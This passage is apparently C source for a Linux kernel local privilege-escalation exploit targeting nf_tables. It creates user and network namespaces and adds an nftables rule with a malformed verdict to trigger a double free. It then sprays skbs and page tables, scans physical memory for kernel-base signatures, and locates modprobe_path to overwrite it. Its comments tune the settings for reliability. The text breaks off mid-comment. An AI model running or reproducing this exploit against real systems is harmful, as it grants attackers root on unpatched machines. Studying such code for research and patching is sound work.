#define _GNU_SOURCE
#include <stdlib.h>
#include <stddef.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <signal.h>
#include <limits.h>
#include <ifaddrs.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/if.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libmnl/libmnl.h>


/* ---------------- v6.3.13 ---------------- */
#include <limits.h>

// include/uapi/linux/netfilter.h
enum {
        NFPROTO_UNSPEC  = 0,
        NFPROTO_INET    = 1,
        NFPROTO_IPV4    = 2,
        NFPROTO_ARP     = 3,
        NFPROTO_NETDEV  = 5,
        NFPROTO_BRIDGE  = 7,
        NFPROTO_IPV6    = 10,
        NFPROTO_DECNET  = 12,
        NFPROTO_NUMPROTO,
};

// include/uapi/linux/netfilter.h
enum nf_inet_hooks {
        NF_INET_PRE_ROUTING,
        NF_INET_LOCAL_IN,
        NF_INET_FORWARD,
        NF_INET_LOCAL_OUT,
        NF_INET_POST_ROUTING,
        NF_INET_NUMHOOKS,
        NF_INET_INGRESS = NF_INET_NUMHOOKS,
};

// include/uapi/linux/netfilter_ipv4.h
enum nf_ip_hook_priorities {
        NF_IP_PRI_FIRST                 = INT_MIN,
        NF_IP_PRI_RAW_BEFORE_DEFRAG     = -450,
        NF_IP_PRI_CONNTRACK_DEFRAG      = -400,
        NF_IP_PRI_RAW                   = -300,
        NF_IP_PRI_SELINUX_FIRST         = -225,
        NF_IP_PRI_CONNTRACK             = -200,
        NF_IP_PRI_MANGLE                = -150,
        NF_IP_PRI_NAT_DST               = -100,
        NF_IP_PRI_FILTER                = 0,
        NF_IP_PRI_SECURITY              = 50,
        NF_IP_PRI_NAT_SRC               = 100,
        NF_IP_PRI_SELINUX_LAST          = 225,
        NF_IP_PRI_CONNTRACK_HELPER      = 300,
        NF_IP_PRI_CONNTRACK_CONFIRM     = INT_MAX,
        NF_IP_PRI_LAST                  = INT_MAX,
};

// include/uapi/linux/netfilter/nf_tables.h
enum nft_payload_bases {
        NFT_PAYLOAD_LL_HEADER,
        NFT_PAYLOAD_NETWORK_HEADER,
        NFT_PAYLOAD_TRANSPORT_HEADER,
        NFT_PAYLOAD_INNER_HEADER,
        NFT_PAYLOAD_TUN_HEADER,
};

// include/uapi/linux/netfilter/nf_tables.h
enum nft_registers {
        NFT_REG_VERDICT,
        NFT_REG_1,
        NFT_REG_2,
        NFT_REG_3,
        NFT_REG_4,
        __NFT_REG_MAX,

        NFT_REG32_00    = 8,
        NFT_REG32_01,
        NFT_REG32_02,
        NFT_REG32_03,
        NFT_REG32_04,
        NFT_REG32_05,
        NFT_REG32_06,
        NFT_REG32_07,
        NFT_REG32_08,
        NFT_REG32_09,
        NFT_REG32_10,
        NFT_REG32_11,
        NFT_REG32_12,
        NFT_REG32_13,
        NFT_REG32_14,
        NFT_REG32_15,
};

// include/uapi/linux/netfilter/nf_tables.h
enum nft_cmp_ops {
        NFT_CMP_EQ,
        NFT_CMP_NEQ,
        NFT_CMP_LT,
        NFT_CMP_LTE,
        NFT_CMP_GT,
        NFT_CMP_GTE,
};

// include/uapi/linux/netlink.h
#define NETLINK_NETFILTER       12

// include/uapi/linux/netfilter/nf_tables.h
enum nf_tables_msg_types {
        NFT_MSG_NEWTABLE,
        NFT_MSG_GETTABLE,
        NFT_MSG_DELTABLE,
        NFT_MSG_NEWCHAIN,
        NFT_MSG_GETCHAIN,
        NFT_MSG_DELCHAIN,
        NFT_MSG_NEWRULE,
        NFT_MSG_GETRULE,
        NFT_MSG_DELRULE,
        NFT_MSG_NEWSET,
        NFT_MSG_GETSET,
        NFT_MSG_DELSET,
        NFT_MSG_NEWSETELEM,
        NFT_MSG_GETSETELEM,
        NFT_MSG_DELSETELEM,
        NFT_MSG_NEWGEN,
        NFT_MSG_GETGEN,
        NFT_MSG_TRACE,
        NFT_MSG_NEWOBJ,
        NFT_MSG_GETOBJ,
        NFT_MSG_DELOBJ,
        NFT_MSG_GETOBJ_RESET,
        NFT_MSG_NEWFLOWTABLE,
        NFT_MSG_GETFLOWTABLE,
        NFT_MSG_DELFLOWTABLE,
        NFT_MSG_GETRULE_RESET,
        NFT_MSG_DESTROYTABLE,
        NFT_MSG_DESTROYCHAIN,
        NFT_MSG_DESTROYRULE,
        NFT_MSG_DESTROYSET,
        NFT_MSG_DESTROYSETELEM,
        NFT_MSG_DESTROYOBJ,
        NFT_MSG_DESTROYFLOWTABLE,
        NFT_MSG_MAX,
};
/* ---------------- v6.3.13 ---------------- */

/* ---------------- Config ---------------- */
#define KMOD_PATH_LEN 256

#define CONFIG_STATIC_USERMODEHELPER 1
#define CONFIG_STATIC_USERMODEHELPER_PATH "/sbin/usermode-helper"

// if CONFIG_PHYSICAL_ALIGN is not defined in kconfig, use the
// CONFIG_PHYSICAL_START value
// - rather too small than too big, but don't deviate from kernel config
#define CONFIG_PHYSICAL_ALIGN ((unsigned long long)0x200000)

// amount of physical memory to scan for kernel bases
// - rather too much than too less, since scanning is very quick
// - scanning cancels when exploit succeeds
// - make sure to account for mmio and stuff, considering laptops may utilize
//   a lot of PCIe physical memory
//   - as a rule of thumb, use 4GiB mmio, because scanning is quick and can't
//     hurt to scan a larger area
// - exploit may get stuck when kernel base is not found and phys mem is out
//   of bounds, press ctrl-c (is is safe)
#define CONFIG_PHYS_MEM (0x800000000 + 0x100000000) // default: 32GiB system ram + 4GiB PCIe mmio and stuff

// amount of physical memory to scan for kernel bases
// - rather too much than too less, since scanning is very quick
// - scanning cancels when exploit succeeds
// - make sure to account for mmio and stuff, considering laptops my utilize
//   a lot of PCIe physical memory
//   - as a rule of thumb, use 4GiB mmio, because scanning is quick and can't
//     hurt to scan a larger area
// - exploit may get stuck when kernel base is not found and phys mem is out
//   of bounds, press ctrl-c (it is safe)
#define CONFIG_PTE_SPRAY_AMOUNT 16000 // default: high-ball for debian systems

// only lower when flexing on people
// - this wait period allows the kernel to make allocations in the background
//   which aren't critical
// - this is useful since we do a lot of init allocations, and wait N seconds
//   before continuing
// - for some reason the success rate is higher without this lol, I guess you
//   could leave it at 0
// #define CONFIG_SEC_BEFORE_STORE 10 // (70/1000 fails)
#define CONFIG_SEC_BEFORE_STORM 0 // (6/1000 fails)

// amount of skb's sprayed on top of corrupted packet
// - more is better, until is isn't
// - not enough skb's lead to kernel panic when kernel encounters corrupted
//   packet in freelist when allocating skb's
// #define CONFIG_SKB_SPRAY_AMOUNT 1 (12/32 fails)
// #define CONFIG_SKB_SPRAY_AMOUNT 64 (4/32 fails)
#define CONFIG_SKB_SPRAY_AMOUNT 170 // (0/651 fails)
/* ---------------- Config ---------------- */

static char intermed_buf[1 << 19];
static char body_buf[1 << 19];

static int sendto_ipv4_ip_sockfd;
static int sendto_ipv4_udp_client_sockfd;
static int sendto_ipv4_udp_server_sockfd;
static int sendto_ipv4_tcp_client_sockfd;
static int sendto_ipv4_tcp_server_sockfd;
static int sendto_ipv4_tcp_server_connection_sockfd;

#define EXPLOIT_STAT_RUNNING	0
#define EXPLOIT_STAT_FINISHED	3

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1

#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), "/proc/%u/fd/%u", (pid), (fd));

void write_file(const char *filename, const char *buf, size_t buflen,
		unsigned int flags)
{
	int fd;

	fd = open(filename, O_WRONLY | O_CREAT | flags, 0755);
	if (fd < 0) {
		perror("open$write_file");
		exit(EXIT_FAILURE);
	}

	if (write(fd, buf, buflen) != buflen) {
		perror("write$write_file");
		exit(EXIT_FAILURE);
	}

	close(fd);
}

int read_file(const char *filename, void *buf, size_t buflen)
{
	int fd;
	int retv;

	fd = open(filename, O_RDONLY);
	if (fd < 0) {
		perror("open$read_file");
		exit(EXIT_FAILURE);
	}

	retv = read(fd, buf, buflen);
	if (retv < 0) {
		perror("read$read_file");
		exit(EXIT_FAILURE);
	}

	close(fd);

	return retv;
}

// Refer: https://git.netfilter.org/libnftnl/tree/examples/nft-table-add.c
static struct nftnl_table *alloc_table(unsigned char family,
				       const char *table)
{
	struct nftnl_table *t;

	t = nftnl_table_alloc();
	if (t == NULL) {
		perror("nftnl_table_alloc");
		exit(EXIT_FAILURE);
	}

	nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
	nftnl_table_set_str(t, NFTNL_TABLE_NAME, table);

	return t;
}

// Refer: https://git.netfilter.org/libnftnl/tree/examples/nft-chain-add.c
static struct nftnl_chain *alloc_chain(unsigned char family,
				       const char *table,
				       const char *chain,
				       unsigned int hook_num)
{
	struct nftnl_chain *c;

	c = nftnl_chain_alloc();
	if (c == NULL) {
		perror("nftnl_chain_alloc");
		exit(EXIT_FAILURE);
	}

	nftnl_chain_set_u32(c, NFTNL_CHAIN_FAMILY, family);
	nftnl_chain_set_str(c, NFTNL_CHAIN_TABLE, table);
	nftnl_chain_set_str(c, NFTNL_CHAIN_NAME, chain);
	nftnl_chain_set_u32(c, NFTNL_CHAIN_HOOKNUM, hook_num);
	/* Only rule in new namespace, so prio shouldn't matter */
	nftnl_chain_set_u32(c, NFTNL_CHAIN_PRIO, NF_IP_PRI_LAST);
	nftnl_chain_set_str(c, NFTNL_CHAIN_TYPE, "filter");

	return c;
}

// Refer: https://www.netfilter.org/projects/nftables/manpage.html
// Payload expressions refer to data from the packet's payload.
static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t dreg,
			uint32_t offset, uint32_t len)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("payload");
	if (e == NULL) {
		perror("expr payload oom");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);

	nftnl_rule_add_expr(r, e);
}

static void add_cmp(struct nftnl_rule *r, uint32_t sreg, uint32_t op,
		    const void *data, uint32_t data_len)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("cmp");
	if (e == NULL) {
		perror("expr cmp oom");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_SREG, sreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_CMP_OP, op);
	nftnl_expr_set(e, NFTNL_EXPR_CMP_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);
}

static void add_set_verdict(struct nftnl_rule *r,
				   uint32_t val)
{
	struct nftnl_expr *e;

	e = nftnl_expr_alloc("immediate");
	if (e == NULL) {
		perror("expr immediate oom");
		exit(EXIT_FAILURE);
	}

	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, val);

	nftnl_rule_add_expr(r, e);
}

static struct nftnl_rule *alloc_rule(unsigned char family,
				     const char *table,
				     const char *chain,
				     unsigned char proto)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc();
	if (r == NULL) {
		perror("nftnl_rule_alloc");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);
	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);

	/* struct iphdr defined in netinet/ip.h */
	add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1,
		    offsetof(struct iphdr, protocol), sizeof(unsigned char));
	/* Skip current rule if cmp return false */
	add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &proto, sizeof(unsigned char));

	add_payload(r, NFT_PAYLOAD_NETWORK_HEADER, NFT_REG_1,
		    sizeof(struct iphdr), 4);
	add_cmp(r, NFT_REG_1, NFT_CMP_EQ, "\x41\x41\x41\x41", 4);

	add_set_verdict(r, (unsigned int)(0xFFFF0000));

	return r;
}

/* Does not work if nft is not installed */
void unconfigure_nftables()
{
	system("/sbin/nft delete table ip filter");
}

void configure_nftables()
{
	struct nftnl_table *t1;
	struct nftnl_chain *c1;
	struct nftnl_rule *r1;
	struct mnl_socket *nl_sock;
	struct mnl_nlmsg_batch *batch;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL);
	struct nlmsghdr *nlh;
	uint32_t portid;
	int ret, batching;

	printf("[+] setting up nftables...\n");

	printf("[+] allocating netfilter objects...\n");
	t1 = alloc_table(NFPROTO_IPV4, "filter");
	c1 = alloc_chain(NFPROTO_IPV4, "filter", "df", NF_INET_PRE_ROUTING);
	r1 = alloc_rule(NFPROTO_IPV4, "filter", "df", 70);

	/*
	 * mnl_socket_open defined in libmnl/libmnl.h which used to
	 * interact with Netlink.
	 */
	nl_sock = mnl_socket_open(NETLINK_NETFILTER);
	if (nl_sock == NULL) {
		perror("mnl_socket_open");
		exit(EXIT_FAILURE);
	}

	if (mnl_socket_bind(nl_sock, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("mnl_socket_bind");
		exit(EXIT_FAILURE);
	}

	/* Check if batch processing of Netlink is supported */
	batching = nftnl_batch_is_supported();
	if (batching < 0) {
		printf("[!] can't comm with nfnetlink");
		exit(EXIT_FAILURE);
	}

	/* Start to batch process Netlink messages */
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	if (batching) {
		nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
		mnl_nlmsg_batch_next(batch);
	}

	/* Build and send Netlink message for creating a table */
	nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
					  NFT_MSG_NEWTABLE,
					  nftnl_table_get_u32(t1, NFTNL_TABLE_FAMILY),
					  NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK,
					  seq++);
	nftnl_table_nlmsg_build_payload(nlh, t1);
	nftnl_table_free(t1);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
					  NFT_MSG_NEWCHAIN,
					  nftnl_chain_get_u32(c1, NFTNL_CHAIN_FAMILY),
					  NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK,
					  seq++);
	nftnl_chain_nlmsg_build_payload(nlh, c1);
	nftnl_chain_free(c1);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
					 NFT_MSG_NEWRULE,
					 nftnl_rule_get_u32(r1, NFTNL_RULE_FAMILY),
					 NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK,
					 seq++);
	nftnl_rule_nlmsg_build_payload(nlh, r1);
	nftnl_rule_free(r1);
	mnl_nlmsg_batch_next(batch);

	if (batching) {
		nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
		mnl_nlmsg_batch_next(batch);
	}
	
	printf("[+] sending nftables tables/chains/rules/expr using netlink...\n");
	ret = mnl_socket_sendto(nl_sock, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret < 0) {
		perror("mnl_socket_sendto");
		exit(EXIT_FAILURE);
	}

	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl_sock, buf, sizeof(buf));
	if (ret < 0) {
		perror("mnl_socket_recvfrom");
		exit(EXIT_FAILURE);
	}

	ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl_sock), NULL, NULL);
	if (ret < 0) {
		perror("mnl_cb_run");
		exit(EXIT_FAILURE);
	}

	/*
	portid = mnl_socket_get_portid(nl_sock);
	ret = mnl_socket_recvfrom(nl_sock, buf, sizeof(buf));
	while (ret > 0) {
		ret = mnl_cb_run(buf, ret , 0, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl_sock, buf, sizeof(buf));
	}
	if (ret == -1) {
		perror("recv netlink");
		exit(EXIT_FAILURE);
	}
	*/

	mnl_socket_close(nl_sock);
}

// Refer: https://android.googlesource.com/platform/system/core/+/refs/heads/main/libnetutils/packet.c#62
static uint32_t ip_checksum(void *buffer, unsigned int count, uint32_t startsum)
{
	uint16_t *up = (uint16_t *)buffer;
	uint32_t sum = startsum;
	uint32_t upper16;

	while (count > 1) {
		sum += *up++;
		count -= 2;
	}

	if (count > 0)
		sum += (uint16_t) *(uint8_t *)up;
	
	while ((upper16 = (sum >> 16)) != 0)
		sum = (sum & 0xffff) + upper16;

	return sum;
}

static inline uint32_t ip_finish_sum(uint32_t sum)
{
	return ~sum & 0xffff;
}

static void sendto_noconn(struct sockaddr_in *addr, const char *buf,
			  size_t buflen, int sockfd)
{
	// printf("[+] doing sendto...\n");
	if (sendto(sockfd, buf, buflen, 0, (struct sockaddr *)addr,
		   sizeof(*addr)) == -1) {
		perror("sendto");
		exit(EXIT_FAILURE);
	}
}

void send_ipv4_ip_hdr(const char *buf, size_t buflen, struct ip *ip_header)
{
	size_t ip_buflen = sizeof(struct ip) + buflen;
	struct sockaddr_in dst_addr = {
		.sin_family		= AF_INET,
		/* 127.0.0.1 will not be ipfrag_time'd (IP fragmentation) */
		.sin_addr.s_addr	= inet_addr("127.0.0.2")
	};

	memcpy(intermed_buf, ip_header, sizeof(*ip_header));
	memcpy(&intermed_buf[sizeof(*ip_header)], buf, buflen);

	// checksum needs to be 0 before
	((struct ip *)intermed_buf)->ip_sum = 0;
	((struct ip *)intermed_buf)->ip_sum =
		ip_finish_sum(ip_checksum(intermed_buf, ip_buflen, 0));

	printf("[+] sending IP packet (%ld bytes)...\n", ip_buflen);

	sendto_noconn(&dst_addr, intermed_buf, ip_buflen, sendto_ipv4_ip_sockfd);
}

void send_ipv4_udp(const char *buf, size_t buflen)
{
	struct sockaddr_in dst_addr = {
		.sin_family		= AF_INET,
		.sin_port 		= htons(45173),
		.sin_addr.s_addr	= inet_addr("127.0.0.1")
	};

	sendto_noconn(&dst_addr, buf, buflen, sendto_ipv4_udp_client_sockfd);
}

void send_ipv4_tcp(const char *buf, size_t buflen)
{
	send(sendto_ipv4_tcp_client_sockfd, buf, buflen, 0);
}

void recv_ipv4_udp(int content_len)
{
	// printf("[+] doing udp recv...\n");
	recv(sendto_ipv4_udp_server_sockfd, intermed_buf, content_len, 0);
	// printf("[+] udp packet preview: %02hhx\n", intermed_buf[0]);
}

void recv_ipv4_tcp()
{
	// printf("[+] doing tcp recv...\n");
	recv(sendto_ipv4_tcp_server_connection_sockfd,
	     intermed_buf, sizeof(intermed_buf), 0);
}

static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
{
	memset(body_buf, chr, dfsize);
	send_ipv4_ip_hdr(body_buf, dfsize, ip_header);
}

static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
{
	printf("[+] sending double free buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
}

static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
{
	printf("[+] sending intermediate buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x00');
}

static void alloc_ipv4_udp(size_t content_size)
{
	// printf("[+] sending udp packet...\n");
	memset(body_buf, '\x00', content_size);
	send_ipv4_udp(body_buf, content_size);
}

int get_udp_server_sockfd(short port)
{
	int sockfd;
	struct sockaddr_in server_addr = {
		.sin_family		= AF_INET,
		.sin_port		= htons(port),
		.sin_addr.s_addr	= inet_addr("127.0.0.1")
	};

	if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
		perror("socket$udp_server");
		exit(EXIT_FAILURE);
	}

	if (bind(sockfd, (const struct sockaddr *)&server_addr,
		 sizeof(server_addr)) == -1) {
		perror("bind$udp_server");
		exit(EXIT_FAILURE);
	}

	return sockfd;
}

int get_tcp_server_sockfd(short port)
{
	int sockfd;
	struct sockaddr_in server_addr = {
		.sin_family		= AF_INET,
		.sin_port		= htons(port),
		.sin_addr.s_addr	= inet_addr("127.0.0.1")
	};

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		perror("socket$tcp_server");
		exit(EXIT_FAILURE);
	}

	if (bind(sockfd, (const struct sockaddr *)&server_addr,
		 sizeof(server_addr)) != 0) {
		perror("bind$tcp_server");
		exit(EXIT_FAILURE);
	}

	// allow N requests to be buffered
	if ((listen(sockfd, 99)) != 0) {
		perror("listen$tcp_server");
		exit(EXIT_FAILURE);
	}

	return sockfd;
}

void populate_sockets()
{
	memset(intermed_buf, '\x00', sizeof(intermed_buf));

	sendto_ipv4_ip_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sendto_ipv4_ip_sockfd == -1) {
		perror("socket$ip");
		exit(EXIT_FAILURE);
	}

	sendto_ipv4_udp_client_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sendto_ipv4_udp_client_sockfd == -1) {
		perror("socket$udp");
		exit(EXIT_FAILURE);
	}

	sendto_ipv4_tcp_client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sendto_ipv4_tcp_client_sockfd == -1) {
		perror("socket$tcp");
		exit(EXIT_FAILURE);
	}

	sendto_ipv4_udp_server_sockfd = get_udp_server_sockfd(45173);
	sendto_ipv4_tcp_server_sockfd = get_tcp_server_sockfd(45174);

	struct sockaddr_in tcp_dst_addr = {
		.sin_family		= AF_INET,
		.sin_port		= htons(45174),
		.sin_addr.s_addr	= inet_addr("127.0.0.1")
	};
	connect(sendto_ipv4_tcp_client_sockfd, (struct sockaddr *)&tcp_dst_addr,
		sizeof(tcp_dst_addr));
	sendto_ipv4_tcp_server_connection_sockfd =
		accept(sendto_ipv4_tcp_server_sockfd, NULL, NULL);
}

static void do_unshare()
{
	int retv;

	printf("[+] creating user namespace (CLONE_NEWUSER)...\n");

	/*
	 * do unshare seperately to make debugging easier
	 *
	 * unshare() allows the current process to create new namespaces
	 * withou creating a new process. By specifying different flags,
	 * various types of namespaces can be created, such as user, net,
	 * filesystem, and more. This provides the foundation for
	 * achieving resource isolation and containerization.
	 */
	retv = unshare(CLONE_NEWUSER);
	if (retv == -1) {
		perror("unshare(CLONE_NEWUSER");
		exit(EXIT_FAILURE);
	}

	printf("[+] creating network namesapce (CLONE_NEWNET)...\n");

	retv = unshare(CLONE_NEWNET);
	if (retv == -1) {
		perror("unshare(CLONE_NEWNET");
		exit(EXIT_FAILURE);
	}
}

static void configure_uid_map(uid_t old_uid, gid_t old_gid)
{
	char uid_map[128];
	char gid_map[128];

	printf("[+] setting up UID namespace...\n");

	sprintf(uid_map, "0 %d 1\n", old_uid);
	sprintf(gid_map, "0 %d 1\n", old_gid);

	/*
	 * write the uid/gid mappings. setgroups = "deny" to prevent
	 * permission error.
	 */
	printf("[+] mapping uid %d to namespace uid 0...\n", old_uid);
	write_file("/proc/self/uid_map", uid_map, strlen(uid_map), 0);

	printf("[+] deny namespace rights to set user groups...\n");
	write_file("/proc/self/setgroups", "deny", strlen("deny"), 0);

	printf("[+] mapping gid %d to namespace gid 0...\n", old_gid);
	write_file("/proc/self/gid_map", gid_map, strlen(gid_map), 0);
}

/*
 * Refer: https://stackoverflow.com/a/17997505
 *
 * Set network interface up by name.
 */
static void bring_interface_up(const char *ifname)
{
	int sockfd;
	struct ifreq ifr;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&ifr, 0, sizeof(ifr));
	/* IFNAMESIZ is max size for interface name */
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	ifr.ifr_flags |= IFF_UP;
	/* SIOCSIFFLAGS: set interface flags */
	ioctl(sockfd, SIOCSIFFLAGS, &ifr);

	close(sockfd);
}

/*
 * disable reverse-path filtering for specified network interface.
 *
 * RPF is a security mechanism used to prevent IP spoofing attacks.
 * RPF ensures that the source address of a packet is legitimate by
 * checking whether the source address can be routed back to the
 * sending interface through the routing table.
 */
static void disable_rpf_by_ifname(const char *ifname)
{
	char rp_filter_path[PATH_MAX];

	printf("[+] disabling rpf for interface: '%s'\n", ifname);

	sprintf(rp_filter_path, "/proc/sys/net/ipv4/conf/%s/rp_filter",
		ifname);

	write_file(rp_filter_path, "0\n", 2, 0);
}

static void disable_rpf_for_all()
{
	struct ifaddrs *addrs;

	getifaddrs(&addrs);

	for (struct ifaddrs *curr = addrs; curr != NULL; curr = curr->ifa_next)
		if (curr->ifa_addr && curr->ifa_addr->sa_family == AF_PACKET)
			disable_rpf_by_ifname(curr->ifa_name);

	freeifaddrs(addrs);
}

static void configure_net_interfaces()
{
	printf("[+] configuring localhost in namespace...\n");

	bring_interface_up("lo");

	// assume echo is installed, and wildcards etc are supported.
	// disable RPF on all interfaces in network namespace.
	printf("[+] disbaling RPF in network namespace...\n");
	disable_rpf_for_all();
	write_file("/proc/sys/net/ipv4/conf/all/rp_filter", "0\n", 2, 0);
}

void setup_env()
{
	uid_t uid = getuid();
	gid_t gid = getgid();

	do_unshare();
	configure_uid_map(uid, gid);
	configure_net_interfaces();
	configure_nftables();
}

static int get_modprobe_path(char *buf, size_t buflen)
{
	int size;

	size = read_file("/proc/sys/kernel/modprobe", buf, buflen);

	if (size == buflen)
		printf("[+] ==== read max amount of modprobe_path bytes, "
		       "perhaps increment KMOD_PATH_LEN? ====\n");

	buf[size-1] = '\x00'; /* remove \x0a */

	return size;
}

static void pin_cpu(int cpu_id)
{
	cpu_set_t mask;

	CPU_ZERO(&mask);
	CPU_SET(cpu_id, &mask);

	if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
		perror("sched_setaffinity");
		exit(1);
	}
}

static void set_ipfrag_time(unsigned int seconds)
{
	int fd;

	// Set ip fragmentation timeout.
	fd = open("/proc/sys/net/ipv4/ipfrag_time", O_WRONLY);
	if (fd < 0) {
		perror("open$ipfrag_time");
		exit(1);
	}

	dprintf(fd, "%u\n", seconds);
	close(fd);
}

// presumably needs to be CPU pinned
static void flush_tlb(void *addr, size_t len)
{
        short *status;

        status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        
        *status = FLUSH_STAT_INPROGRESS;
        if (fork() == 0) {
                munmap(addr, len);
                *status = FLUSH_STAT_DONE;
                printf("[+] flush tlb thread gonna sleep\n");
                sleep(9999);
        }

        SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

        munmap(status, sizeof(short));
}

// Refer: https://github.com/notselwyn/get-sig (TODO)
static int is_kernel_base(unsigned char *addr)
{
	// thanks python
	
	// get-sig kernel_runtime_1
	if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
			memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
		return 1;

	// get-sig kernel_runtime_2
	if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
			memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
			memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
			memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
			memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
			memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
			memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
			memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
			memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
			memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
			memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
		return 1;


	return 0;
}

static int strcmp_modprobe_path(char *new_str)
{
        char buf[KMOD_PATH_LEN] = { '\x00' };

        get_modprobe_path(buf, KMOD_PATH_LEN);

        return strncmp(new_str, buf, KMOD_PATH_LEN);
}

void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len,
                           char *modprobe_path_str, size_t modprobe_path_len)
{
        void *pmd_modprobe_addr;

        // search 0x200000 bytes (a full PTE at time) for the modprobe_path
        // signature.
        pmd_modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str,
                                   modprobe_path_len);
        if (pmd_modprobe_addr == NULL)
                return NULL;
        
        // check if this is the actual modprobe by overwriting it, and
        // checking /proc/sys/kernel/modprobe.
        strcpy(pmd_modprobe_addr, "/sanitycheck");
        if (strcmp_modprobe_path("/sanitycheck") != 0) {
                printf("[-] ^false positive. skipping to next one\n");
                return NULL;
        }

        return pmd_modprobe_addr;
}

static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);

	fexecve(fd, &argv_envp, &argv_envp);
	
	close(fd);
}

/*
 * Refer: arch/x86/include/asm/pgtable_64_types.h
 * #define PAGE_SHIFT	12
 * #define PMD_SHIFT	21
 * #define PUD_SHIFT	30
 * #define PGDIR_SHIFT	39
 *
